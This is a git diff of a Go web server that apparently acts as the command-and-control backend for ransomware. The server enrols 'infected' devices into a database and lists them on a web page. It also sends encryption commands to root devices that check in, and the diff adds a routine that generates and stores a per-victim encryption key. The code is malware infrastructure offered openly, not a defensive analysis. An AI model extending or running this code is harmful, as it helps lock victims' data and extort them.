@@ -2,10 +2,14 @@ package Webserver
 
 import (
 	"encoding/json"
+	"fmt"
 	"html/template"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"net/http"
+	"strings"
+	"time"
 
 	"github.com/fatih/color"
 )
@@ -26,7 +30,8 @@ var (
 	devices []Enumeration
 )
 
-//used for querying that webserver is running
+//Query webserver is running
+//Writes confirmation message to page
 func HomeHandler(w http.ResponseWriter, r *http.Request) {
 	defaultMessage := []byte("Listening for incoming connections ")
 	_, err := w.Write(defaultMessage)
@@ -35,7 +40,8 @@ func HomeHandler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-//listening for agents to enroll infected device (RegisterHost())
+//listens for agents to enroll infected device (RegisterHost())
+//enrols the agent into the DB
 func InfectedHandler(w http.ResponseWriter, r *http.Request) {
 
 	req, err := ioutil.ReadAll(r.Body)
@@ -45,6 +51,10 @@ func InfectedHandler(w http.ResponseWriter, r *http.Request) {
 	json.Unmarshal([]byte(req), &device)
 	log.Printf("Enrolled a new device: %s", device.ID)
 	device.Encrypted = false
+
+	//TODO: call the key creation logic
+	key := GenerateKey()
+	device.Key = key
 
 	dbConnection, err := Connect() //connect to the database
 	if err != nil {
@@ -58,6 +68,7 @@ func InfectedHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 //user page to view enrolled devices
+//writes table with database entries
 func ViewInfected(w http.ResponseWriter, r *http.Request) {
 	t, err := template.ParseFiles("./pages/infected.gohtml")
 	if err != nil {
@@ -74,9 +85,9 @@ func ViewInfected(w http.ResponseWriter, r *http.Request) {
 	t.Execute(w, devices)
 }
 
+//Issue commands to listening hosts
+//Tied to Agent.KeepAlive()
 func CommandHandler(w http.ResponseWriter, r *http.Request) {
-	//Reads the header of the request and issue commands
-	//Tied to Agent.KeepAlive()
 
 	color.Red("Device %s requesting commands \n", device.ID)
 	if device.User == "Root" && !device.Encrypted {
@@ -85,9 +96,28 @@ func CommandHandler(w http.ResponseWriter, r *http.Request) {
 		w.Write(command)
 		//TODO: update device.Encrypted = true -- Update function
 		//err = update(device)
+		//TODO: download the binary from the website
 
 	} else {
 		command := []byte("Wait")
 		w.Write(command)
 	}
+}
+
+//generates an encryption key
+func GenerateKey() string {
+	rand.Seed(time.Now().Unix())
+	chars := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
+		"abcdefghijklmnopqrstuvwxyz" +
+		"0123456789" +
+		"!@#$%^&*")
+
+	var b strings.Builder
+
+	for x := 0; x < 30; x++ {
+		b.WriteRune(chars[rand.Intn(len(chars))])
+	}
+	str := b.String()
+	fmt.Printf("this is the key: %s \n", str) //TODO: remove this debugging print
+	return str
 }
